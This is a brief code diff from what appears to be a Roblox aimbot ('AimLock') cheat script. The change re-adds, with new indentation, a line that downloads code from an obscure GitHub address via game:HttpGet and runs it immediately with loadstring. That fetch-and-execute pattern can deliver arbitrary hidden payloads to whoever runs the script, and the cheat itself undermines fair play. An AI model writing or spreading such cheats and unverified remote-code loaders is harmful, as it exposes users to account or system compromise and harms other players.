@@ -63,4 +63,5 @@ RunService:BindToRenderStep("AimLock", 0, function()
 game.Loaded:Wait()
 end
 
-loadstring(game:HttpGet("https://github.com/asdasdasd2sd23sda/pastor"))()
+
+    loadstring(game:HttpGet("https://github.com/asdasdasd2sd23sda/pastor"))()
